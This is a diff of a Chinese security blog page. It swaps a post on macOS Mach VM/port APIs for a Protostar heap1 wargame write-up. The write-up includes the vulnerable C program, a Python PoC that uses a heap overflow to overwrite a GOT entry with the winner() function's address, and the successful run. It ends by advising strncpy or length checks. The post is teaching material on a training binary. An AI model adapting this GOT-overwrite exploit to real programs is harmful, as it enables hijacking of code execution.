@@ -6,38 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://github.com/NULL-ME/NULL-ME.github.io.git">
-  <title>Mach vm*API | 4chendy</title>
+  <title>Protostar-堆溢出系列学习-heap 1 | 4chendy</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="exec函数流程
-mach_vm_*
-mach_vm_cllocate
-1mach_vm_allocate(vm_map_t map,mach_vm_address_t  *address,mach_vm_size_t size,int flags);
-
-
-在map中分配size个字节大小的内存，根据flags的不同会有不同的处理方式。address是一个I/O的参数（例如：获取分配后的内存大小）">
+  <meta name="description" content="0x00 序现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。
+0x01 heap1C代码
+123456789101112131415161718192021222324252627282930313233#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdi">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Mach vm*API">
-<meta property="og:url" content="https://github.com/NULL-ME/NULL-ME.github.io.git/2017/03/05/Mach vm*API/exec函数流程/index.html">
+<meta property="og:title" content="Protostar-堆溢出系列学习-heap 1">
+<meta property="og:url" content="https://github.com/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/index.html">
 <meta property="og:site_name" content="4chendy">
-<meta property="og:description" content="exec函数流程
-mach_vm_*
-mach_vm_cllocate
-1mach_vm_allocate(vm_map_t map,mach_vm_address_t  *address,mach_vm_size_t size,int flags);
-
-
-在map中分配size个字节大小的内存，根据flags的不同会有不同的处理方式。address是一个I/O的参数（例如：获取分配后的内存大小）">
-<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/f10c5443276635863d7ac7aea6fa2e6db76ce2c3/png/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B.png">
-<meta property="og:updated_time" content="2017-04-10T13:56:41.000Z">
+<meta property="og:description" content="0x00 序现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。
+0x01 heap1C代码
+123456789101112131415161718192021222324252627282930313233#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdi">
+<meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 1/0-0.png">
+<meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 1/0-1.png">
+<meta property="og:updated_time" content="2017-04-21T01:21:34.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Mach vm*API">
-<meta name="twitter:description" content="exec函数流程
-mach_vm_*
-mach_vm_cllocate
-1mach_vm_allocate(vm_map_t map,mach_vm_address_t  *address,mach_vm_size_t size,int flags);
-
-
-在map中分配size个字节大小的内存，根据flags的不同会有不同的处理方式。address是一个I/O的参数（例如：获取分配后的内存大小）">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/f10c5443276635863d7ac7aea6fa2e6db76ce2c3/png/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B.png">
+<meta name="twitter:title" content="Protostar-堆溢出系列学习-heap 1">
+<meta name="twitter:description" content="0x00 序现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。
+0x01 heap1C代码
+123456789101112131415161718192021222324252627282930313233#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdi">
+<meta name="twitter:image" content="https://github.com/NULL-ME/NULL-ME.github.io.git/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 1/0-0.png">
   
     <link rel="alternative" href="/atom.xml" title="4chendy" type="application/atom+xml">
   
@@ -179,66 +168,36 @@ mach_vm_cllocate
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Mach vm*API/exec函数流程" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Mach vm*API
+      Protostar-堆溢出系列学习-heap 1
     </h1>
   
 
         
         <a href="" class="archive-article-date">
-  	<time datetime="2017-03-04T17:51:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-05</time>
+  	<time datetime="2017-04-10T03:12:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-10</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="exec函数流程"><a href="#exec函数流程" class="headerlink" title="exec函数流程"></a>exec函数流程</h2><p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/f10c5443276635863d7ac7aea6fa2e6db76ce2c3/png/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B.png" alt="exec函数流程"></p>
-<h2 id="mach-vm"><a href="#mach-vm" class="headerlink" title="mach_vm_*"></a><code>mach_vm_*</code></h2><ul>
-<li><p>mach_vm_cllocate</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mach_vm_allocate(<span class="keyword">vm_map_t</span> <span class="built_in">map</span>,<span class="keyword">mach_vm_address_t</span>  *address,<span class="keyword">mach_vm_size_t</span> size,<span class="keyword">int</span> flags);</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>在map中分配size个字节大小的内存，根据flags的不同会有不同的处理方式。address是一个I/O的参数（例如：获取分配后的内存大小）。如果flags的值不是<code>VM_FLAGS_ANYWHERE</code>，那么内存将被分配到address指向的地址。</p>
-<ul>
-<li>mach_vm_region<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">kern_return_t</span></div><div class="line">mach_vm_region(</div><div class="line">	<span class="keyword">vm_map_t</span>		 <span class="built_in">map</span>,</div><div class="line">	<span class="keyword">mach_vm_offset_t</span>	*address,		<span class="comment">/* IN/OUT */</span></div><div class="line">	<span class="keyword">mach_vm_size_t</span>	*size,			<span class="comment">/* OUT */</span></div><div class="line">	<span class="keyword">vm_region_flavor_t</span>	 flavor,		<span class="comment">/* IN */</span></div><div class="line">	<span class="keyword">vm_region_info_t</span>	 info,			<span class="comment">/* OUT */</span></div><div class="line">	<span class="keyword">mach_msg_type_number_t</span>	*count,			<span class="comment">/* IN/OUT */</span></div><div class="line">	<span class="keyword">mach_port_t</span>		*object_name)		<span class="comment">/* OUT */</span></div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>获取map指向的任务内，address地址起始的VM region（虚拟内存区域）的信息。目前标记为flavor只有<code>VM_BASIC_INFO_64</code>。<br>获得的info的数据结构如下。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">struct vm_region_basic_info_64 &#123;</div><div class="line">	vm_prot_t 	protection<span class="comment">;</span></div><div class="line">	vm_prot_t		max_protection<span class="comment">;</span></div><div class="line">	vm_inherit_t		inheritance<span class="comment">;</span></div><div class="line">	<span class="keyword">boolean_t	</span>	<span class="keyword">shared;</span></div><div class="line">	<span class="keyword">boolean_t	</span>	reserved<span class="comment">;</span></div><div class="line">	memory_object_offset_t	offset<span class="comment">;</span></div><div class="line">	vm_behavior_t		<span class="keyword">behavior;</span></div><div class="line">	unsigned <span class="keyword">short	</span>	user_wired_count<span class="comment">;</span></div><div class="line">&#125;<span class="comment">;</span></div></pre></td></tr></table></figure></p>
-<ul>
-<li>mach_vm_protect<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">kern_return_t</span></div><div class="line">mach_vm_protect(</div><div class="line">	<span class="keyword">mach_port_name_t</span> 	task,</div><div class="line">	<span class="keyword">mach_vm_address_t</span> 	address,</div><div class="line">	<span class="keyword">mach_vm_size_t</span> 	size,</div><div class="line">	<span class="keyword">boolean_t</span> 	set_maximum,</div><div class="line">	<span class="keyword">vm_prot_t</span> 	new_protection)</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>对address到address+size这一段的内存设置内存保护策略,new_protection就是最后设置成为的保护机制。</p>
-<ul>
-<li>mach_vm_write<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">kern_return_t</span></div><div class="line">mach_vm_write(</div><div class="line">	<span class="keyword">vm_map_t</span>		<span class="built_in">map</span>,</div><div class="line">	<span class="keyword">mach_vm_address_t</span>		address,</div><div class="line">	<span class="keyword">pointer_t</span>			data,</div><div class="line">	__unused <span class="keyword">mach_msg_type_number_t</span>	size)</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>对address指向的内存改写内容。</p>
-<ul>
-<li>mach_vm_read<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">kern_return_t</span> </div><div class="line">mach_vm_read(</div><div class="line">	<span class="keyword">vm_map_t</span> 	target_task, </div><div class="line">	<span class="keyword">mach_vm_address_t</span> 	address, </div><div class="line">	<span class="keyword">mach_vm_size_t</span> 	size, </div><div class="line">	<span class="keyword">vm_offset_t</span> 	*data,   </div><div class="line">	<span class="keyword">mach_msg_type_number_t</span> 	*dataCnt);</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>对address指向的内存读取内容.</p>
-<h2 id="mach-port"><a href="#mach-port" class="headerlink" title="mach_port_*"></a><code>mach_port_*</code></h2><ul>
-<li>mach_port_allocate<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">kern_return_t</span> </div><div class="line">mach_port_allocate(</div><div class="line">	<span class="keyword">ipc_space_t</span> 	task, </div><div class="line">	<span class="keyword">mach_port_right_t</span> 	right,</div><div class="line">	<span class="keyword">mach_port_name_t</span> 	*name);</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>task指要分配端口的任务(<code>mach_task_self()</code>)，right指分配给该端口的权限，name指代分配端口名的地址<br><code>Ports有如下权限，Ports可以在不同的task之间传递，通过传递可以赋予其他task对ports的操作权限。例如POC中使用的就是在父进程与子进程之间传递Port得到了对内存操作的权限。</code><br>    <figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#define MACH_PORT_RIGHT_SEND		((<span class="name">mach_port_right_t</span>) <span class="number">0</span>)</div><div class="line">#define MACH_PORT_RIGHT_RECEIVE		((<span class="name">mach_port_right_t</span>) <span class="number">1</span>)</div><div class="line">#define MACH_PORT_RIGHT_SEND_ONCE	((<span class="name">mach_port_right_t</span>) <span class="number">2</span>)</div><div class="line">#define MACH_PORT_RIGHT_PORT_SET	((<span class="name">mach_port_right_t</span>) <span class="number">3</span>)</div><div class="line">#define MACH_PORT_RIGHT_DEAD_NAME	((<span class="name">mach_port_right_t</span>) <span class="number">4</span>)</div><div class="line">#define MACH_PORT_RIGHT_LABELH	        ((<span class="name">mach_port_right_t</span>) <span class="number">5</span>)</div><div class="line">#define MACH_PORT_RIGHT_NUMBER		((<span class="name">mach_port_right_t</span>) <span class="number">6</span>)</div></pre></td></tr></table></figure></p>
-<ul>
-<li>mach_port_insert_right<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">kern_return_t</span> </div><div class="line">mach_port_insert_right(</div><div class="line">	<span class="keyword">ipc_space_t</span>		task, </div><div class="line">	<span class="keyword">mach_port_name_t</span> 		name, </div><div class="line">	<span class="keyword">mach_port_t</span> 		poly, </div><div class="line">	<span class="keyword">mach_msg_type_name_t</span>	 polyPoly);</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/</a></li>
-<li><a href="https://developer.apple.com/reference/kernel/1578704-mach_port_allocate" target="_blank" rel="external">https://developer.apple.com</a></li>
-</ul>
+        <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。</p>
+<h2 id="0x01-heap1"><a href="#0x01-heap1" class="headerlink" title="0x01 heap1"></a>0x01 heap1</h2><p>C代码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> internet &#123;</div><div class="line">  <span class="keyword">int</span> priority;</div><div class="line">  <span class="keyword">char</span> *name;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"and we have a winner @ %d\n"</span>, time(<span class="literal">NULL</span>));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">struct</span> internet *i1, *i2, *i3;</div><div class="line"></div><div class="line">  i1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> internet));</div><div class="line">  i1-&gt;priority = <span class="number">1</span>;</div><div class="line">  i1-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">  i2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> internet));</div><div class="line">  i2-&gt;priority = <span class="number">2</span>;</div><div class="line">  i2-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">  <span class="built_in">strcpy</span>(i1-&gt;name, argv[<span class="number">1</span>]);</div><div class="line">  <span class="built_in">strcpy</span>(i2-&gt;name, argv[<span class="number">2</span>]);</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"and that's a wrap folks!\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="0x02-简单的分析-amp-思考"><a href="#0x02-简单的分析-amp-思考" class="headerlink" title="0x02 简单的分析&amp;思考"></a>0x02 简单的分析&amp;思考</h2><p>如果之前没有相关的漏洞利用经验的话，一时还是想不到怎么去利用这个堆溢出漏洞。但这里有两个<code>strcpy</code>，肯定是要去覆盖和修改某个地方的地址。<br>其实<code>strcpy</code>这个函数是非常危险的，既能溢出，又能对任意地址进行写操作。<br>在这个列子中，我们就借此去修改<code>printf</code>函数的GOT表。</p>
+<h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>1.查看堆分配情况<br><img src="/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 1/0-0.png" alt="0-0"><br>2.查看汇编代码，找到执行入口<br><img src="/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 1/0-1.png" alt="0-1"><br>3.首先利用第一个<code>strcpy</code>将i2的name指针改为GOT表地址，然后利用第二个<code>strcpy</code>向这个地址写入<code>winner</code>的地址，由此编写对应的Python PoC</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">padding = <span class="string">"AAAA"</span>*<span class="number">5</span></div><div class="line">put_got = <span class="keyword">struct</span>.pack(<span class="string">"I"</span>, <span class="number">0x8049774</span>) <span class="meta">#put的GOT表地址</span></div><div class="line">space = <span class="string">" "</span></div><div class="line">winner = <span class="keyword">struct</span>.pack(<span class="string">"I"</span>, <span class="number">0x8048494</span>) <span class="meta">#winner函数地址</span></div><div class="line"><span class="built_in">print</span> padding+put_got+space+winner</div></pre></td></tr></table></figure>
+<p>4.hack</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">user@protostar<span class="symbol">:/tmp</span>$ /opt/protostar/bin/heap1 <span class="string">`python  heap1.py`</span></div><div class="line"><span class="keyword">and</span> we have a winner @ <span class="number">1492452139</span></div></pre></td></tr></table></figure>
+<p><strong>成功执行winner函数</strong></p>
+<h1 id="0x04-一点感受"><a href="#0x04-一点感受" class="headerlink" title="0x04 一点感受"></a>0x04 一点感受</h1><p>学到现在，感受很多，对用户输入的数据完全信任是多么的可怕。可能有一万种的方法去利用这个漏洞达到代码执行。比如这里，将<code>strcpy</code>改为<code>strncpy</code>或者在copy前先检查下长度的话就能避免。所以写好一个有质量的代码是多么重要。</p>
 
       
 
@@ -278,15 +237,15 @@ mach_vm_cllocate
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">macOS内核</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">mach</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Protostar</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">vm</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">栈溢出</a>
         		</li>
       		
 		</ul>
@@ -342,7 +301,7 @@ mach_vm_cllocate
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=https://github.com/NULL-ME/NULL-ME.github.io.git/2017/03/05/Mach vm*API/exec函数流程/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://github.com/NULL-ME/NULL-ME.github.io.git/2017/04/10/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -356,18 +315,18 @@ mach_vm_cllocate
   
 <nav id="article-nav">
   
-    <a href="../../CVE-2016-1757/cve-2016-1757/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="../../Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          cve-2016-1757
+          Protostar-堆溢出系列学习-heap 0
         
       </div>
     </a>
   
   
-    <a href="../../../../../2016/12/06/macOS内核框架/macOS内核架构-功能/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">macOS内核知识点整理</div>
+    <a href="../../mach-o动态链接/mach-o动态链接/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Mach-o动态链接</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -381,7 +340,7 @@ mach_vm_cllocate
   
   <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="Mach vm*API/exec函数流程" data-title="Mach vm*API" data-url="https://github.com/NULL-ME/NULL-ME.github.io.git"></div>
+	<div class="ds-thread" data-thread-key="Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1" data-title="Protostar-堆溢出系列学习-heap 1" data-url="https://github.com/NULL-ME/NULL-ME.github.io.git"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
